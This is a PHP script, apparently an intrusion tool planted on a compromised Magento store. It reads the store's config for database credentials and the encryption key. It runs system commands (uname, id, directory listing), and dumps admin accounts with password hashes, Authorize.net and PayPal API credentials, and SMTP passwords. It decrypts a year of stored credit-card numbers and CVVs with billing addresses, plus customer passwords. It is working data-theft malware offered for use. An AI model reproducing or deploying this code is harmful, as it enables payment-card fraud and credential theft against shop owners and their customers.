<?php

try {
	$antiloop = 0;
	while(ob_get_level()) {
		ob_end_clean();
		if ($antiloop++ > 100) break;
	}

	error_reporting(0);
	ob_start();

	getInfoSite::searchMagento($rootDir, $pathConfig, $version);
	
	$object = getInfoSite::getInstance($rootDir, $pathConfig, $version);
	$object->start();

	$contents = ob_get_contents();
	ob_end_clean();
?>
	<div id="outputContent">
		<style type="text/css">
			div {font-size: 18px; }
			table {border-collapse: collapse;}
			td {font-size: 12px; padding: 0 3px; font-family: Courier New; border: 1px solid black; color: black; white-space: pre;}
			thead {font-size: 14px; font-weight: bolder; background-color: #f1f1f1;}
			tr:hover {background-color: #ffe8a4 !important;}
			body {background-color: white; color:black; margin: 10px;}
			pre {margin: 0;}
		</style>
		<div class="main">
			<?= $contents ?>
		</div>
	</div>
	<script>
		var value = document.getElementById("outputContent").innerHTML;
		document.body.innerHTML = value;
	</script>
<?php
	die();

} catch (Exception $ex) {
	echo("error: <b>" . htmlspecialchars($ex->getMessage()) . "</b></br>");
?>
	<form action="?" method="post">
		<input type="text" name="rootDir" value="<?= $pathRoot ?>"> : path to root dir shop <br/>
		<input type="text" name="pathConfig" value="<?= $pathConfig ?>"> : path to config (local.xml or env.php) <br/>
		<input type="radio" name="version" value="1" checked> Magento 1.*<br />
		<input type="radio" name="version" value="2"> Magento 2.*<br />
		<input type="submit">
	</form>
<?php
	die();
}


class getInfoSite {

	static function getInstance($rootDir, $pathConfig, $version) {
		$object = new self($rootDir, $pathConfig, $version);
		return $object;
	}

	static function searchMagento(&$rootDir, &$pathConfig, &$version) {
		if (file_exists(getcwd() . '/app/etc/local.xml')) {
			$rootDir = getcwd();
			$pathConfig = $rootDir . '/app/etc/local.xml';
			$version = 1;
		} elseif(file_exists(getcwd() . '/app/etc/env.php')) {
			$rootDir = getcwd();
			$pathConfig = $rootDir . '/app/etc/env.php';
			$version = 2;
		} elseif(file_exists(getcwd() . '/../app/etc/env.php')) {
			$rootDir = getcwd() . '/../';
			$pathConfig = $rootDir . '/app/etc/env.php';
			$version = 2;
		} elseif (file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/etc/local.xml')) {
			$rootDir = $_SERVER['DOCUMENT_ROOT'];
			$pathConfig = $rootDir . '/app/etc/local.xml';
			$version = 1;
		} elseif(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/etc/env.php')) {
			$rootDir = $_SERVER['DOCUMENT_ROOT'];
			$pathConfig = $rootDir . '/app/etc/env.php';
			$version = 2;
		}elseif(file_exists($_SERVER['DOCUMENT_ROOT'] . '/../app/etc/env.php')) {
			$rootDir = $_SERVER['DOCUMENT_ROOT'] . '/../';
			$pathConfig = $rootDir . '/app/etc/env.php';
			$version = 2;
		}

		if (!empty($_REQUEST['rootDir'])) {
			$rootDir = $_REQUEST['rootDir'];
		}

		if (!empty($_REQUEST['pathConfig'])) {
			$pathConfig = $_REQUEST['pathConfig'];
		}

		if (!empty($_REQUEST['version'])) {
			$version = intval($_REQUEST['version']);
		}
	}

	/**	@var mysqli */
	var $sql = null;
	/** @var magentoMcrypt */
	var $crypto = null;
	var $prefix = '';
	var $connection = array();
	
	var $rootDir = null;
	var $pathConfig = null;
	var $version = null;

	/** @var getInfoSite php5.3 compability */
	var $object = null;

	public function __construct($rootDir, $pathConfig, $version)
	{
		$this->rootDir = $rootDir;
		$this->version = $version;
		$this->pathConfig = $pathConfig;

		$this->object = $this;
	}

	function start()
	{
		if ($this->version == 1) {
			return $this->loadMagento1();
		} elseif ($this->version == 2) {
			return $this->loadMagento2();
		} else {
			throw new Exception('Unknown magento version');
		}
	}

	function loadMagento2()
	{
		if(!file_exists($this->pathConfig) || !is_file($this->pathConfig)  || !is_readable($this->pathConfig)){
			throw new Exception('Can not found ' . $this->pathConfig);
		}

		$config = include($this->pathConfig);

		$key = null;
		$connection = null;
		$adminhtml = null;
		$prefix = null;

		if (!empty($config['db']['connection']['default'])) {
			$connection	 = $config['db']['connection']['default'];
			$prefix		 = !empty($config['db']['table_prefix']) ? $config['db']['table_prefix'] : '';
			$adminhtml	 = $config['backend']['frontName'];
			$key		 = $config['crypt']['key'];
		}

		$connection = array(
			'host'		 => $connection['host'],
			'username'	 => $connection['username'],
			'password'	 => $connection['password'],
			'dbname'	 => $connection['dbname'],
		);


		$this->initLoader($connection, $prefix, $adminhtml, $key);

		echo($this->printConfigData($connection, $prefix, $adminhtml, $key));
		echo($this->printServerInfo());
		echo($this->printOrderCount());
		echo($this->printAdmin());
		echo($this->printTotalInfo());
	}

	function loadMagento1()
	{
		if(!file_exists($this->pathConfig) || !is_file($this->pathConfig)  || !is_readable($this->pathConfig)){
			throw new Exception('Can not found ' . $this->pathConfig);
		}
		
		$xml = simplexml_load_file($this->pathConfig);
		if ($xml === false) {
			throw new Exception('Can not parse local.xml ' . $this->pathConfig);
		}
		
		$key = null;
		$connection = null;
		$adminhtml = null;
		$prefix = null;

		if (isset($xml->global->resources->default_setup->connection)) {
			$connection	 = $xml->global->resources->default_setup->connection;
			$prefix		 = $xml->global->resources->db->table_prefix;
			$adminhtml	 = $xml->admin->routers->adminhtml->args->frontName;
			$key		 = $xml->global->crypt->key; //f8cd1881e3bf20108d5f4947e60acfc1
		}

		if (!$connection) {
			throw new Exception('Can not parse local.xml ' . $this->pathConfig);
		}

		$connection = array(
			'host' => $connection->host,
			'username' => $connection->username,
			'password' => $connection->password,
			'dbname' => $connection->dbname,
		);

		$this->initLoader($connection, $prefix, $adminhtml, $key);
		
		echo($this->printConfigData($connection, $prefix, $adminhtml, $key));
		echo($this->printServerInfo());
		echo($this->printOrderCount());
		echo($this->printAdmin());
		echo($this->printTotalInfo());
	}
	
	function initLoader($connection, $prefix, $adminhtml, $key)
	{
		$this->prefix = $prefix;
		$this->connection = $connection;

		$host = $connection['host'];

		if (preg_match('#\.sock$#i', $host)) {
			$this->sql = new mysqli(null, $connection['username'], $connection['password'], $connection['dbname'], null, $host);
		} else {
			$this->sql = new mysqli($connection['host'], $connection['username'], $connection['password'], $connection['dbname']);
		}

		if ($this->sql->connect_errno) {
			throw new Exception('Can not connect: ' . $this->sql->connect_error);
		}

		$this->crypto = new magentoMcrypt();
		$this->crypto->init($key);
	}

	function printConfigData($connection, $prefix, $adminhtml, $key)
	{
		$object = $this->object;

		$content = $this->outputTable(
			array(
				'website',
				'mysql',
				'frontname',
				'cryptkey'
			),
			function() use ($connection, $prefix, $adminhtml, $key, $object) {
				$hosts = implode("\n",$object->sqlColumn("SELECT value as website FROM " . $object->prefix .  "core_config_data WHERE path='web/unsecure/base_url'"));

				$adminList = $object->sqlColumn("SELECT value FROM " . $object->prefix .  "core_config_data WHERE path='admin/url/custom_path'");
				$adminList[] = $adminhtml;
				$adminList = implode("\n", $adminList);
			
				return
					$object->outputRowTable(
						$hosts,
						implode('|', array_filter(array_merge($connection, array($prefix)))),
						$adminList,
						$key
					);
			},
			null,
			'Base Information'
		);
		return $content;
	}



	function printServerInfo()
	{
		$object = $this->object;

		$content = $this->outputTable(
			null,
			function() use ($object){
				$content = '';

				$content .= $object->outputRowTable('ServerName', $_SERVER['SERVER_NAME']);
				$content .= $object->outputRowTable('ServerIP', $_SERVER['SERVER_ADDR']);
				$content .= $object->outputRowTable('Software', 'PHP' . phpversion() . ' / ' . substr(@$_SERVER['SERVER_SOFTWARE'], 0, 20));
				$content .= $object->outputRowTable('RootDir', $_SERVER['DOCUMENT_ROOT']);
				$content .= $object->outputRowTable('Config', $object->pathConfig);
				$content .= $object->outputRowTable('Version', 'Magento ' . $object->version);
				if (file_exists($object->rootDir . '/.git') ||file_exists($object->rootDir . '/.gitignore')) {
					$content .= $object->outputRowTable('GIT', 'enabled');
				}
				$content .= $object->outputRowTable('uname', $object->execSystem('uname -a'));
				$content .= $object->outputRowTable('user', $object->execSystem('id'));
				$content .= $object->outputRowTable('file listing', $object->execSystem('ls -la "' . $object->rootDir . '"'));

				$databases = $object->sqlColumn('SHOW DATABASES');
				$exclude = array(
					'information_schema',
					'performance_schema',
					'mysql',
					$object->connection['dbname'],
				);
				$databases = array_diff($databases, $exclude);

				if (count($databases)) {
					$content .= $object->outputRowTable('Another DB', implode("\n", $databases));
				}				

				return $content;
			},
			null,
			'Server Information'
		);

		return $content;
	}

	function printAdmin()
	{
		if ($this->version == 2) {
			$sql = "SELECT user.user_id,firstname,lastname,email,username,password,DATE_FORMAT(created,'%Y/%m/%d'),DATE_FORMAT(modified,'%Y/%m/%d'),DATE_FORMAT(logdate,'%Y/%m/%d'),lognum,is_active, ".
					"	(SELECT group_concat(role_name) FROM `" . $this->prefix . "authorization_role` AS sub_role WHERE role.parent_id=sub_role.role_id) AS role_group ".
					"FROM " . $this->prefix . "admin_user AS user ".
					"LEFT JOIN " . $this->prefix . "authorization_role AS role ON (role.user_id=user.user_id) ".
					"GROUP BY user.user_id ".
					"ORDER BY role_group, is_active DESC, logdate DESC";
		} else {
			$sql = "SELECT user.user_id,firstname,lastname,email,username,password,DATE_FORMAT(created,'%Y/%m/%d'),DATE_FORMAT(modified,'%Y/%m/%d'),DATE_FORMAT(logdate,'%Y/%m/%d'),lognum,is_active, ".
					"	(SELECT group_concat(role_name) FROM `" . $this->prefix . "admin_role` AS sub_role WHERE role.parent_id=sub_role.role_id) AS role_group ".
					"FROM " . $this->prefix . "admin_user AS user ".
					"LEFT JOIN " . $this->prefix . "admin_role AS role ON (role.user_id=user.user_id) ".
					"GROUP BY user.user_id ".
					"ORDER BY role_group, is_active DESC, logdate DESC";
		}
		
		$content = $this->outputTable(
			array(
				'id ',
				'firstname',
				'lastname',
				'email',
				'username',
				'password',
				'created',
				'modified',
				'logdate',
				'lognum',
				'is_active',
				'group'
			),
			$this->outputRowsAllSql($sql),
			false,
			'Admin'
		);

		return $content;
	}

	function printOrderCount()
	{
		if ($this->version == 2) {
			$content = $this->outputTable(
				array(
					'method',
					'count',
				),
				$this->outputRowsAllSql(
					"SELECT sfop.method AS method, count(method) AS order_count ".
					"FROM " . $this->prefix . "sales_order AS sfo ".
					"LEFT JOIN " . $this->prefix . "sales_order_payment AS sfop ON (sfop.parent_id = sfo.entity_id) ".
					"WHERE ".
					"	sfo.created_at BETWEEN (CURRENT_DATE() - INTERVAL 1 MONTH) AND CURRENT_DATE() ".
					"GROUP BY ".
					"	sfop.method "
				),
				function() {
					return '<tr><td colspan=2>no order</td></tr>';
				},
				'Orders count'
			);
		} else {
			$content = $this->outputTable(
				array(
					'method',
					'count',
				),
				$this->outputRowsAllSql(
					"SELECT sfop.method AS method, count(method) AS order_count ".
					"FROM " . $this->prefix . "sales_flat_order AS sfo ".
					"LEFT JOIN " . $this->prefix . "sales_flat_order_payment AS sfop ON (sfop.parent_id = sfo.entity_id) ".
					"WHERE ".
					"	sfo.created_at BETWEEN (CURRENT_DATE() - INTERVAL 1 MONTH) AND CURRENT_DATE() ".
					"GROUP BY ".
					"	sfop.method "
				),
				function() {
					return '<tr><td colspan=2>no order</td></tr>';
				},
				'Orders count'
			);
		}

		return $content;
	}

	function printTotalInfo()
	{
		$content = '';
		$object = $this->object;

		$content .= $this->outputTable(
			array(
				'raw_user',
				'raw_pass',
				'decrypted_user',
				'decrypted_pass',
			),
			function() use ($object) {
				$data = $object->sqlRow(
					"SELECT (SELECT value FROM " . $object->prefix . "core_config_data where path = 'payment/authorizenet/login' limit 1) as user, ".
						"(SELECT value FROM " . $object->prefix . "core_config_data where  path = 'payment/authorizenet/trans_key' limit 1) as pass"
				);
				if ($data['user'] && $data['pass']) {
					return $object->outputRowTable(
						$data['user'],
						$data['pass'],
						$object->crypto->decrypt($data['user']),
						$object->crypto->decrypt($data['pass'])
					);
				}

				return false;
			},
			false,
			'Authorizenet API account'
		);

		$content .= $this->outputTable(
			array(
				'business_account',
				'api_username',
				'api_password',
				'api_signature'
			),
			function() use ($object) {
				$data = $object->sqlRow(
					"SELECT (SELECT a.value FROM " . $object->prefix . "core_config_data as a WHERE path = 'paypal/general/business_account' limit 1) as account, ".
						"(SELECT b.value FROM " . $object->prefix . "core_config_data as b WHERE path = 'paypal/wpp/api_username' limit 1) as username, ".
						"(SELECT c.value FROM " . $object->prefix . "core_config_data as c WHERE path = 'paypal/wpp/api_password' limit 1) as password, ".
						"(SELECT d.value FROM " . $object->prefix . "core_config_data as d WHERE path = 'paypal/wpp/api_signature' limit 1) as signature "
				);
				if (count( array_filter($data) )) {
					$data['username'] = $object->crypto->decrypt($data['username']);
					$data['password'] = $object->crypto->decrypt($data['password']);
					$data['signature'] = $object->crypto->decrypt($data['signature']);
					
					return $object->outputRowTable($data);
				}

				return false;
			},
			false,
			'PayPal API account'
		);
		
		$content .= $this->outputTable(
			array(
				'host',
				'port',
				'username',
				'password'
			),
			function() use ($object) {
				$data = $object->sqlRow(
					"SELECT (SELECT a.value FROM " . $object->prefix . "core_config_data as a WHERE path = 'system/smtpsettings/host' limit 1) as host , ".
						"(SELECT b.value FROM " . $object->prefix . "core_config_data as b WHERE path = 'system/smtpsettings/port' limit 1) as port, ".
						"(SELECT c.value FROM " . $object->prefix . "core_config_data as c WHERE path = 'system/smtpsettings/username' limit 1) as user , ".
						"(SELECT d.value FROM " . $object->prefix . "core_config_data as d WHERE path = 'system/smtpsettings/password' limit 1) as pass"
				);
				if (count( array_filter($data) )) {
					return $object->outputRowTable($data);
				}

				return false;
			},
			false,
			'SMTP settings'
		);

		$content .= $this->outputTable(
			array(
				'Date',
				'Owner',
				'method',
				'Credit Number',
				'Credit Exp',
				'CVV',
				'Address',
			),
			function() use ($object) {
				$data = $object->sqlAll(
					"(SELECT ".
					"	sfo.updated_at,sfo.cc_owner,sfo.method,sfo.cc_number_enc,sfo.cc_cid_enc, ".
					"	CONCAT(sfo.cc_exp_month,'|',sfo.cc_exp_year) as exp, ".
					"	CONCAT_WS('|',billing.firstname,billing.lastname,billing.street,billing.city,billing.region,billing.postcode,billing.country_id,billing.telephone,billing.email) AS 'Billing' ".
					"FROM " . $object->prefix . "sales_flat_quote_payment AS sfo ".
					"LEFT JOIN " . $object->prefix . "sales_flat_quote_address AS billing ON (billing.quote_id = sfo.quote_id AND billing.address_type = 'billing') ".
					"WHERE sfo.cc_number_enc != '' AND sfo.updated_at >  (CURRENT_DATE() - INTERVAL 1 YEAR) ) ".
					"UNION ".
					"(SELECT ".
					"	parent.updated_at,sfo.cc_owner,sfo.method,sfo.cc_number_enc,sfo.cc_cid_status, ".
					"	CONCAT(sfo.cc_exp_month,'|',sfo.cc_exp_year) as exp, ".
					"	CONCAT_WS('|',billing.firstname,billing.lastname,billing.street,billing.city,billing.region,billing.postcode,billing.country_id,billing.telephone,billing.email) AS 'Billing' ".
					"FROM " . $object->prefix . "sales_flat_order_payment AS sfo ".
					"LEFT JOIN " . $object->prefix . "sales_flat_order_address AS billing ON (billing.parent_id = sfo.parent_id AND billing.address_type = 'billing') ".
					"LEFT JOIN " . $object->prefix . "sales_flat_order AS parent ON (parent.entity_id = sfo.parent_id) ".
					"WHERE sfo.cc_number_enc != '' AND parent.updated_at> (CURRENT_DATE() - INTERVAL 1 YEAR) ) "
				);
				
				if (empty($data)) {
					return false;
				}
				
				$content = '';
				foreach($data as $row) {
					$row['cc_number_enc'] = $object->crypto->decrypt($row['cc_number_enc']);
					$row['cc_cid_enc'] = $object->crypto->decrypt($row['cc_cid_enc']);

					$content .= $object->outputRowTable($row);
				}

				return $content;
			},
			false,
			'Cards (last year)'
		);


		$content .= $this->outputTable(
			array(
				'user',
				'pass',
			),
			function() use ($object) {
				$data = $object->sqlAll(
					"SELECT customer_email AS user,password_hash AS pass FROM " . $object->prefix . "sales_flat_quote"
				);

				if (empty($data)) {
					return false;
				}

				$content = '';
				foreach($data as $row) {
					if (empty($row['user']) || empty($row['pass'])){
						continue;
					}

					$row['pass'] = trim($object->crypto->decrypt($row['pass']));

					if (empty($row['pass'])) {
						continue;
					}

					$content .= $object->outputRowTable($row);
				}

				return $content;
			},
			false,
			'Customers'
		);

		return $content;
	}

	function execSystem($command)
	{
		$return = array();
		ob_start();

		exec($command, $return);

		$contents = ob_get_contents();
		ob_end_clean();


		if (!empty($return)) {
			$result = implode("\n", $return);
		} else {
			$result = null;
		}
		
		return $result;
	}

	function sqlValue($query)
	{
		$result = $this->sql->query($query);

		if ($result === false) {
			return false;
		}

		$data = $result->fetch_row();
		if (empty($data[0])) {
			return false;
		}

		return $data[0];
	}

	function sqlRow($query)
	{
		$result = $this->sql->query($query);

		if ($result === false) {
			return false;
		}

		return $result->fetch_assoc();
	}


	function sqlColumn($query, $columnNumber = 0)
	{
		$result = $this->sql->query($query);

		if ($result === false) {
			return false;
		}

		$data = array();
		while($row = $result->fetch_row()){
			if (isset($row[$columnNumber])) {
				$data[] = $row[$columnNumber];
			}
		}

		return $data;
	}
	function sqlAll($query)
	{
		$result = $this->sql->query($query);

		if ($result === false) {
			return false;
		}

		$data = array();
		while($row = $result->fetch_assoc()){
			$data[] = $row;
		}

		return $data;
	}
	
	function outputRowsAllSql($query)
	{
		$data = $this->sqlAll($query);
		
		$content = '';

		if (is_array($data)) {
			foreach ($data as $row) {
				$content .= $this->outputRowTable($row);
			}
		}

		return $content;
	}

	function outputTitleBlock($title)
	{
		return '<hr /> <b>[ ' . htmlspecialchars($title) . ' ]</b> <hr />' . "\n";
	}

	function outputTable($headers = array(), $funcReturnData = null, $funcOnEmptyContent = null, $titleBlock = null)
	{
		$content = '';

		if (!empty($headers)) {
			$content .= '<thead><tr><td>' . implode('</td><td>', $headers) . '</td></tr></thead>' . "\n";
		}
		
		$innerContent = null;
		if (is_callable($funcReturnData)) {
			$innerContent = $funcReturnData();
		} elseif (is_scalar($funcReturnData)) {
			$innerContent = $funcReturnData;
		}
	
		if (!$innerContent) {
			if (is_callable($funcOnEmptyContent)) {
				$innerContent = $funcOnEmptyContent();
			} elseif (is_scalar($funcOnEmptyContent)) {
				$innerContent = $funcOnEmptyContent;
			}

			if ($innerContent === false) {
				return '';
			}	
		}

		$content .=
			'<tbody>' . "\n" .
				$innerContent .
			'</tbody>' . "\n";

		$content =
			'<table>' . "\n" .
				$content .
			'</table>' . "\n";

		if (!empty($titleBlock)) {
			$content = $this->outputTitleBlock($titleBlock) . $content;
		}

		return $content;
	}

	function outputRowTable()
	{
		$arg = func_get_args();
		if (count($arg) == 1 && is_array($arg[0])) {
			$arg = $arg[0];
		}

		if (count($arg) == 0) {
			return false;
		}

		$arg = array_map('htmlspecialchars', $arg);
		
		$content = implode('</td><td>', $arg);
		$content = '<tr><td>' . $content . '</td></tr>' . "\n";

		return $content;
	}

}



class magentoMcrypt {
	var $handler = null;
	public function init($key)
	{
		if (!function_exists('mcrypt_module_open')) {
			return false;
		}

		$this->handler	 = mcrypt_module_open(MCRYPT_BLOWFISH, '', MCRYPT_MODE_ECB, '');
		$iv				 = mcrypt_create_iv(mcrypt_enc_get_iv_size($this->handler), MCRYPT_RAND);
		$maxKeySize		 = mcrypt_enc_get_key_size($this->handler);

		if (iconv_strlen($key, 'UTF-8') > $maxKeySize) {
			return false;
		}

		mcrypt_generic_init($this->handler, $key, $iv);

		return $this;
	}

	public function encrypt($data)
	{
		if (!$this->handler) {
			return $data;
		}

		if (strlen($data) == 0) {
			return $data;
		}
		return base64_encode(mcrypt_generic($this->handler, $data));
	}

	public function decrypt($data)
	{
		if (!$this->handler) {
			return $data;
		}
		if (strlen($data) == 0) {
			return $data;
		}
		return mdecrypt_generic($this->handler, base64_decode($data));
	}
	public function __destruct()
	{
		if ($this->handler) {
			$this->_reset();
		}
	}

	function _reset()
	{
		if ($this->handler) {
			mcrypt_generic_deinit($this->handler);
			mcrypt_module_close($this->handler);
			$this->handler = null;
		}
	}

}
